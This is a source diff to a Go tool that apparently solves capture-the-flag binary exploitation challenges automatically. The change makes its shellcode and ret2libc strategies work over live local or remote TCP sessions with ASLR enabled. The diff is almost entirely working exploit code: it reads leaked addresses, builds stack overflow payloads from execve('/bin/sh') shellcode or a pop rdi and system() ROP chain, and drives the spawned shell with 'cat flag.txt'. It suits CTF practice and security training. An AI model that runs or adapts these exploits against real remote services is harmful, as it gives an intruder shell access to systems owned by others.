@@ -5,24 +5,26 @@ import (
 	"context"
 	"debug/elf"
 	"fmt"
+	"os"
 	"os/exec"
 	"regexp"
 	"strconv"
+	"time"
 
 	"github.com/MoriartyPuth/PwnProbes/internal/extract"
 	"github.com/MoriartyPuth/PwnProbes/internal/runner"
+	"github.com/MoriartyPuth/PwnProbes/internal/session"
 )
 
-// These strategies use a runtime address the target leaks to stdout. Because the
-// runner sends stdin once and cannot read the leak mid-run, the target is run
-// under `setarch -R` (ASLR disabled) so an address parsed from a baseline run is
-// still valid in the exploit run. This is appropriate for local teaching labs,
-// not a remote or hardened target. After control is taken, a shell is spawned
-// and driven with a trailing `cat flag.txt` so the flag reaches stdout.
+// These strategies use a runtime address the target leaks at run time. They run
+// over a live session (local subprocess or remote TCP), reading the leak and
+// sending the exploit within one connection, so they work with ASLR enabled and
+// against a remote service. After control transfer a shell is spawned and driven
+// with a trailing `cat flag.txt` so the flag reaches the transcript.
 
-// driveShell is fed to the spawned shell on stdin after the overflow line, so
-// the flag reaches stdout. setup() makes stdin unbuffered in these labs, so the
-// vulnerable gets()/fgets() consumes only its line and leaves this for the shell.
+// driveShell is sent to the spawned shell after the overflow line. The labs make
+// stdin unbuffered, so the vulnerable read consumes only its line and leaves this
+// for the shell. A remote service may read the flag from a different path.
 const driveShell = "cat flag.txt\n"
 
 // execveBinSh is a null-tolerant, newline-free x86-64 execve("/bin/sh",
@@ -45,42 +47,84 @@ func leakOffsets() []int {
 	return out
 }
 
-func haveSetarch() bool {
-	_, err := exec.LookPath("setarch")
-	return err == nil
-}
-
-// baselineLeaks runs the target once with benign input under setarch and returns
-// the distinct pointer-sized values it printed.
-func (s *solver) baselineLeaks(ctx context.Context) ([]uint64, error) {
-	result, err := runner.Run(ctx, runner.Request{Program: "setarch", Args: []string{"-R", s.path}, Input: []byte("\n"), Timeout: s.timeout, WorkDir: s.workDir})
-	if err != nil {
-		return nil, err
-	}
-	var out []uint64
+// parseLeaks returns the distinct pointer-sized values printed in out.
+func parseLeaks(out string) []uint64 {
+	var leaks []uint64
 	seen := map[uint64]bool{}
-	for _, m := range leakRe.FindAllString(result.Stdout, -1) {
+	for _, m := range leakRe.FindAllString(out, -1) {
 		v, err := strconv.ParseUint(m[2:], 16, 64)
 		if err != nil || v < 0x1000 || seen[v] {
 			continue
 		}
 		seen[v] = true
-		out = append(out, v)
+		leaks = append(leaks, v)
 	}
-	return out, nil
+	return leaks
 }
 
-// attemptSetarch runs one payload under setarch, records it, and finalizes the
-// report when a non-echoed flag is recovered.
-func (s *solver) attemptSetarch(ctx context.Context, strategy, note string, input []byte) (bool, error) {
-	result, err := runner.Run(ctx, runner.Request{Program: "setarch", Args: []string{"-R", s.path}, Input: input, Timeout: s.timeout, WorkDir: s.workDir})
+func (s *solver) idle() time.Duration {
+	if s.remote != "" {
+		return 600 * time.Millisecond
+	}
+	return 300 * time.Millisecond
+}
+
+// open starts a connection to the target: a remote TCP service when a remote
+// address is set, otherwise a local subprocess running in the binary's directory.
+func (s *solver) open(ctx context.Context) (*session.Conn, func(), error) {
+	if s.remote != "" {
+		conn, err := session.Dial(ctx, s.remote, 5*time.Second)
+		return conn, func() {}, err
+	}
+	tmp, err := os.MkdirTemp("", "pwnprobe-sess-")
+	if err != nil {
+		return nil, nil, err
+	}
+	cleanup := func() { os.RemoveAll(tmp) }
+	env := []string{"PATH=/usr/bin:/bin", "LANG=C", "LC_ALL=C", "HOME=" + tmp, "TMPDIR=" + tmp}
+	conn, err := session.Spawn(ctx, s.path, nil, env, s.workDir)
+	if err != nil {
+		cleanup()
+		return nil, nil, err
+	}
+	return conn, cleanup, nil
+}
+
+// liveAttempt runs one exploit attempt over a fresh connection: it reads the
+// pre-input output (including any leak), lets build construct a payload from the
+// leaked values, sends it followed by the shell driver, and records whether a
+// non-echoed flag came back. build returns ok=false to skip (for example when the
+// expected leak is absent), which is not an error.
+func (s *solver) liveAttempt(ctx context.Context, strategy string, build func(leaks []uint64) (payload []byte, note string, ok bool)) (bool, error) {
+	conn, cleanup, err := s.open(ctx)
 	if err != nil {
 		return false, err
 	}
-	cands := s.ex.Find(result.Stdout, input, "stdout")
-	cands = append(cands, s.ex.Find(result.Stderr, input, "stderr")...)
+	defer cleanup()
+	defer conn.Close()
+
+	pre := conn.RecvUntilIdle(s.idle())
+	payload, note, ok := build(parseLeaks(string(pre)))
+	if !ok {
+		return false, nil
+	}
+	input := append(append(append([]byte{}, payload...), '\n'), []byte(driveShell)...)
+	if err := conn.Send(input); err != nil {
+		return false, nil // target closed; treat as a failed attempt, not a solve error
+	}
+	post := conn.RecvUntilIdle(s.idle())
+	out := string(pre) + string(post)
+
+	cands := s.ex.Find(out, input, "session")
 	recovered := extract.Recovered(cands)
-	a := Attempt{Strategy: strategy, Payload: string(input), Note: note, Result: result, Candidate: cands, Recovered: recovered}
+	a := Attempt{
+		Strategy:  strategy,
+		Payload:   string(input),
+		Note:      note,
+		Result:    runner.Result{Outcome: "session", ExitCode: -1, Stdout: out},
+		Candidate: cands,
+		Recovered: recovered,
+	}
 	s.report.Attempts = append(s.report.Attempts, a)
 	if len(recovered) > 0 {
 		s.report.Solved = true
@@ -92,33 +136,44 @@ func (s *solver) attemptSetarch(ctx context.Context, strategy, note string, inpu
 	return false, nil
 }
 
+// pickStackLeak returns the leaked value most likely to be a stack address.
+func pickStackLeak(leaks []uint64) (uint64, bool) {
+	best, ok := uint64(0), false
+	for _, l := range leaks {
+		if l >= 0x7f0000000000 && l > best {
+			best, ok = l, true
+		}
+	}
+	if ok {
+		return best, true
+	}
+	for _, l := range leaks { // fall back to the largest leak
+		if l > best {
+			best, ok = l, true
+		}
+	}
+	return best, ok
+}
+
 // shellcodeStrategy solves an executable-stack overflow that leaks its buffer
-// address: it writes shellcode at the buffer start, pads to the return address,
-// and overwrites it with the leaked buffer address so the shellcode runs.
+// address: it writes shellcode at the buffer, pads to the return address, and
+// overwrites it with the leaked buffer address so the shellcode runs.
 func (s *solver) shellcodeStrategy(ctx context.Context) (bool, error) {
 	bin := s.report.Binary
 	if bin.Bits != 64 || bin.Protections["nx"].Status != "disabled" {
 		return false, nil // executable stack only
 	}
-	if !haveSetarch() {
-		s.report.Limitations = append(s.report.Limitations, "setarch not available; shellcode strategy needs ASLR disabled to reuse a leaked address")
-		return false, nil
-	}
-	leaks, err := s.baselineLeaks(ctx)
-	if err != nil {
-		return false, err
-	}
-	if len(leaks) == 0 {
-		s.report.Limitations = append(s.report.Limitations, "no address leaked; shellcode strategy needs the target to print its buffer address")
-		return false, nil
-	}
-	for _, buf := range leaks {
-		for _, off := range leakOffsets() {
-			if off < len(execveBinSh) {
-				continue
-			}
-			if err := ctx.Err(); err != nil {
-				return false, err
+	for _, off := range leakOffsets() {
+		if off < len(execveBinSh) {
+			continue
+		}
+		if err := ctx.Err(); err != nil {
+			return false, err
+		}
+		done, err := s.liveAttempt(ctx, "shellcode", func(leaks []uint64) ([]byte, string, bool) {
+			buf, ok := pickStackLeak(leaks)
+			if !ok {
+				return nil, "", false
 			}
 			payload := make([]byte, 0, off+8)
 			payload = append(payload, execveBinSh...)
@@ -127,77 +182,75 @@ func (s *solver) shellcodeStrategy(ctx context.Context) (bool, error) {
 			}
 			payload = append(payload, qword(buf)...)
 			if bytes.IndexByte(payload, '\n') >= 0 {
-				continue // a newline would truncate the gets() line
+				return nil, "", false
 			}
-			input := append(append(payload, '\n'), []byte(driveShell)...)
-			note := fmt.Sprintf("shellcode@%#x padding=%d", buf, off)
-			if done, err := s.attemptSetarch(ctx, "shellcode", note, input); err != nil || done {
-				return done, err
-			}
+			return payload, fmt.Sprintf("shellcode@%#x padding=%d", buf, off), true
+		})
+		if err != nil || done {
+			return done, err
 		}
 	}
 	return false, nil
 }
 
-// ret2libcStrategy solves an NX target that leaks a libc address: it resolves
-// the libc base from the leak, finds system() and a "/bin/sh" string, and builds
-// a pop-rdi; "/bin/sh"; [ret]; system() chain to spawn a shell.
+// ret2libcStrategy solves an NX target that leaks a libc address: it resolves the
+// libc base from the leak, finds system() and a "/bin/sh" string, and builds a
+// pop rdi; "/bin/sh"; [ret]; system() chain to spawn a shell.
 func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 	bin := s.report.Binary
 	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" || bin.Protections["nx"].Status != "enabled" {
-		return false, nil
-	}
-	if !haveSetarch() {
 		return false, nil
 	}
 	f, err := elf.Open(s.path)
 	if err != nil {
 		return false, err
 	}
-	defer f.Close()
-	popRDI, ok := findGadget(f, []byte{0x5f, 0xc3}) // pop rdi; ret
-	if !ok {
+	popRDI, okRDI := findGadget(f, []byte{0x5f, 0xc3})
+	ret, haveRet := retGadget(f)
+	f.Close()
+	if !okRDI {
 		return false, nil
 	}
-	ret, haveRet := retGadget(f)
 	sysOff, binshOff, ok := resolveLibc(s.path)
 	if !ok {
-		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped")
+		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped (remote targets may use a different libc)")
 		return false, nil
 	}
-	leaks, err := s.baselineLeaks(ctx)
-	if err != nil {
-		return false, err
-	}
-	for _, leak := range leaks {
-		base := leak - sysOff
-		if base%0x1000 != 0 { // the leak is system() only if this gives a page-aligned base
-			continue
-		}
-		binsh := base + binshOff
-		for _, off := range leakOffsets() {
-			for _, align := range []bool{true, false} {
-				if align && !haveRet {
-					continue
+	for _, off := range leakOffsets() {
+		for _, align := range []bool{true, false} {
+			if align && !haveRet {
+				continue
+			}
+			if err := ctx.Err(); err != nil {
+				return false, err
+			}
+			done, err := s.liveAttempt(ctx, "ret2libc", func(leaks []uint64) ([]byte, string, bool) {
+				var base, system uint64
+				found := false
+				for _, l := range leaks {
+					if (l-sysOff)%0x1000 == 0 { // a page-aligned base confirms this leak is system()
+						base, system, found = l-sysOff, l, true
+						break
+					}
 				}
-				if err := ctx.Err(); err != nil {
-					return false, err
+				if !found {
+					return nil, "", false
 				}
+				binsh := base + binshOff
 				payload := bytes.Repeat([]byte("A"), off)
 				payload = append(payload, qword(popRDI)...)
 				payload = append(payload, qword(binsh)...)
 				if align {
 					payload = append(payload, qword(ret)...)
 				}
-				payload = append(payload, qword(leak)...) // system() runtime address
+				payload = append(payload, qword(system)...)
 				if bytes.IndexByte(payload, '\n') >= 0 {
-					continue
+					return nil, "", false
 				}
-				input := append(append(payload, '\n'), []byte(driveShell)...)
-				note := fmt.Sprintf("ret2libc padding=%d binsh=%#x system=%#x align=%v", off, binsh, leak, align)
-				if done, err := s.attemptSetarch(ctx, "ret2libc", note, input); err != nil || done {
-					return done, err
-				}
+				return payload, fmt.Sprintf("ret2libc padding=%d binsh=%#x system=%#x align=%v", off, binsh, system, align), true
+			})
+			if err != nil || done {
+				return done, err
 			}
 		}
 	}
